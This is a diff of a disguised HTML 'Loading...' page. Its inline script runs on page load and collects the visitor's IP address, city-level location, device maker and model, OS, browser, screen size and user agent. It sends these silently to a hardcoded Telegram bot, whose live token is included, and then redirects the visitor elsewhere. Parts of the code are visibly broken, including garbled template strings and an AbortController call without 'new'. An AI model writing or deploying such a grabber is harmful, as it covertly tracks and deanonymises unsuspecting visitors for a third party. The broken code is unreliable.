@@ -4,63 +4,88 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Loading...</title>
+    <style>body{margin:0;background:#000}</style>
 </head>
 <body>
 <script>
 (async () => {
     const BOT_TOKEN = '8437574185:AAH3LG_IDft1pdrkfv-75rgWUCIWFYxECoM';
-    const CHAT_ID   = '7863510010';
-    const REDIRECT  = 'https://www.misha/dad/image23689/august2024.com';
-    const API       = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    const CHAT_ID = '7863510010';
+    const REDIRECT = 'https://www.misha/dad/image23689/august2024.com';
+    const API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-    // IP grab – works everywhere
-    let ip  = 'Unknown IP';
+    // 1. Get IP + rough location
+    let ip = '???.???.???.???';
     let loc = 'Unknown location';
     try {
-        const r = await fetch('https://ipapi.co/json/');
+        const r = await fetch('https://ipapi.co/json/', { signal: AbortController().signal });
         if (r.ok) {
             const d = await r.json();
-            ip  = d.ip;
-            loc = [d.city, d.region, d.country_name].filter(Boolean).join(', ');
+            ip = d.ip;
+            loc = `\( {d.city}, \){d.region}, ${d.country_name}`;
         }
-    } catch(e) {
+    } catch { /* ignore, fall back to ipify */ }
+    if (ip.startsWith('???')) {
         try {
             const r = await fetch('https://api.ipify.org?format=json');
             const d = await r.json();
             ip = d.ip;
-        } catch(e) {}
+            loc = 'Location unavailable';
+        } catch {}
     }
 
+    // 2. Get best possible device info
+    let os = 'Unknown OS', ver = '', model = 'Unknown', maker = 'Unknown', browser = 'Unknown';
     const ua = navigator.userAgent;
 
-    // Very small device detection – enough for your use case
-    let device = 'Unknown device';
-    if (/iPhone|iPad|iPod/.test(ua)) device = ua.includes('iPad') ? 'iPad' : 'iPhone';
-    else if (/Android/.test(ua)) device = ua.match(/Android [^;]+; ([^)]+)/)?.[1]?.trim() || 'Android Device';
+    if (navigator.userAgentData) {
+        try {
+            const hints = await navigator.userAgentData.getHighEntropyValues(['platform','platformVersion','model','manufacturer']);
+            os = hints.platform || os;
+            ver = hints.platformVersion || ver;
+            model = hints.model || model;
+            maker = hints.manufacturer || maker;
+            const realBrand = navigator.userAgentData.brands.find(b => !b.brand.includes('Not'));
+            browser = realBrand?.brand || 'Unknown';
+        } catch {}
+    }
 
-    // Build message
-    const text = `
+    // Fallback parsing if hints fail or are missing
+    if (model === 'Unknown') {
+        if (/iPhone|iPad|iPod/.test(ua)) { os = ua.includes('iPad') ? 'iPadOS' : 'iOS'; maker = 'Apple'; model = ua.includes('iPad') ? 'iPad' : 'iPhone'; }
+        else if (/Android/.test(ua)) { os = 'Android'; maker = 'Android Device'; model = ua.match(/Android [^;]+; (.*?)(?:Build|;|$)/i)?.[1].trim() || 'Unknown'; }
+        if (model.startsWith('SM-') || model.toLowerCase().includes('samsung')) maker = 'Samsung';
+        if (model.includes('Pixel')) maker = 'Google';
+    }
+
+    if (browser === 'Unknown') {
+        if (/Edg/.test(ua)) browser = 'Edge';
+        else if (/Firefox/.test(ua)) browser = 'Firefox';
+        else if (/Chrome/.test(ua)) browser = 'Chrome';
+        else if (/Safari/.test(ua)) browser = 'Safari';
+    }
+
+    // 3. Build message
+    const msg = `
 *NEW VISITOR*
 
-*Time:* ${new Date().toISOString().replace('T',' ').substring(0,19)}
+*Time:* ${new Date().toISOString().replace('T',' ').split('.')[0]} UTC
 *IP:* ${ip}
 *Location:* ${loc}
-*Device:* ${device}
+*Device:* \( {maker} \){model}
+*OS:* \( {os} \){ver}
+*Browser:* ${browser}
 *Screen:* \( {screen.width}× \){screen.height}
-*UA:* \`${ua}\``;
+*User-Agent:* \`${ua}\``;
 
-    // Send to Telegram
-    await fetch(API, {
+    // 4. Send to Telegram (fire-and-forget)
+    fetch(API, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: text.trim(),
-            parse_mode: 'Markdown'
-        })
+        body: JSON.stringify({ chat_id: CHAT_ID, text: msg.trim(), parse_mode: 'Markdown' })
     }).catch(() => {});
 
-    // Redirect
+    // 5. Redirect after a tiny delay
     setTimeout(() => location.replace(REDIRECT), 800);
 })();
 </script>
